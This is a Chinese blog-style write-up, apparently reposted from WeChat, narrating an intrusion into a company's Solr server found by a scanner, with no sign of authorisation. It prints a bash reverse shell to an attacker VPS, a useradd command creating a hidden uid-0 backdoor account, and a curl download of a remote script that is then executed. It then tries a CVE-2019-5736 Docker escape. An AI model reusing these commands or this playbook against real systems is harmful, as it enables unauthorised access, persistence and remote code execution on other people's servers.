# 从RCE到尝试docker逃逸的曲折之路

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzkxNDAyNTY2NA==&mid=2247495190&idx=1&sn=62bebb655a2de6ede7a445bcdbabbc26&chksm=c17613b9f6019aaf1bed287cae2fe015de37dbe627335f0aa492247df9a0dfd201c5b53d5b22&scene=126&sessionid=1681407940#rd](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247495190&idx=1&sn=62bebb655a2de6ede7a445bcdbabbc26&chksm=c17613b9f6019aaf1bed287cae2fe015de37dbe627335f0aa492247df9a0dfd201c5b53d5b22&scene=126&sessionid=1681407940#rd)

  

  

**01**前言

日常日站,在测试某企业的时候扫描器突然发生反应,发现个solr,然后就有了这篇文章。

**02**前戏

看solr的版本

![](../Images/08f83d35e6906c2f14c7f5f2113fe154.png)

正好之前研究过一段时间的solr的一些rce,挨个试试

![](../Images/61b92af3d1443b194593ce94fe666853.png)

在一顿操作后,啪的一下很快哈,找到一个`CVE-2019-17558`可以利用

  

**03**命令执行

尝试使用CVE-2019-17558脚本执行命令

![](../Images/b096c52a937b85a35fab425ef9da55fe.png)

运气爆棚直接就是root权限,我自己都不明白为啥是root,兴奋之极赶紧反弹shell呀

`bash -i >& /dev/tcp/xx.xx.169.148/1234 0>&1`

![](../Images/43cd694ece1f3bb2ad1f82b96f9ad44e.png)

报错500,当时我就懵逼了

  

看了看自己的vps,发现啥反应都没有,估计是poc不支持,换了好几个都没用,咋办呀

  

很快哈,看一下ssh开了没,开了的话直接创个用户直接连上去不就行了

![](../Images/a8f8f9c675e6e64cf681714116e4b23b.png)

开了,开搞,一句话创建用户设置密码并给root权限

  

`useradd -p 0`openssl passwd -1 -salt 'abc' cqrdpass`-u 0 -o -g root -G root -s /bin/bash -d /usr/bin/cqrd cqrd`

看一下/etc/passwd

![](../Images/7285311580a2798ce48e56a2184dd73c.png)

但是....

  

连接的时候我直接去世

![](../Images/0bfebb1558b1e6fdac5ccb4400c8f800.png)

去查了一下发现是设置过ssh配置文件,这可咋整，我决定在试试反弹shell

**04**再次尝试

  

这次换一种方法,直接在vps上的web下载到本地  

`curl xx.xx.169.148/123.sh -o 123.sh`

爆了500

![](../Images/07a5b432523798a0d29055c0f6af99e5.png)

看一下目录

![](../Images/07a8e5cd7b5f7074695fe41eb1bcfb8f.png)

ohhhh,上传上去了，然后就是，给权限，执行

`bash ./123.sh`

![](../Images/b8ca4e67bf909498ebe541469c6e4d6d.png)

当我执行第二个命令的时候我又去世了

![](../Images/124341e94a2e20131527727bfdc2c721.png)

居然是docker,试试`` `CVE-2019-5736` ``

使用go编译

![](../Images/d3276e7672b463492eb4dbaa8c176bdd.png)

发现可以,但是...然后呢?  
![](../Images/8dc663da9ddd7e60ab2e1c0e2a697d45.png)  
仔细一看发现需要别人启动才会触发

![](../Images/51cccaad7dd9f0c7ca475006796a988b.png)

这一等就是一天,发现什么鬼都没弹,还时不时的被别的ip访问而断开

  

于是我决定,不搞了收工  
![](../Images/048805e7a6536736ce9fcfd9edf2b59e.png)

**05**总结

感觉这一次实战学习到了很多,期间还试过jsp码子上到webapp上面链接,但是发现不行,发现22端口那个ssh有可能是主机的ssh,还是有很多的问题没有解决,我还是需要多多学习,告辞。
